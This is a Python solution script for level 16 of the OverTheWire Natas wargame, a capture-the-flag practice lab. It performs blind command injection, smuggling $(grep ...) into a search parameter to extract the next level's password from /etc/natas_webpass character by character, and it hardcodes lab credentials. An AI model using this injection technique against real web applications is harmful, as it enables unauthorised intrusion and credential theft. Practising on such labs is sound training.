import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''
auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

print("Determining Char Values")
for char in chars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=doomed$(grep '+char+' /etc/natas_webpass/natas17)&submit=Search', auth=auth)
    if 'doomed' not in r.text :
        filtered = filtered + char
        print(filtered)

# # Ran the above ahead of time
# filtered='bcdghkmnqrswAGHNPQSW035789'
# passwd='bn5rd9S7GmAdgQNdkhPkq9cw'

print("\nCracking PW")
for i in range(0,32):
    print("{}:".format(i),end='')
    for char in filtered:
        r = requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=doomed$(grep ^'+passwd+char+' /etc/natas_webpass/natas17)&submit=Search', auth=auth)
        if 'doomed' not in r.text :
            passwd = passwd + char
            print(passwd)
            break
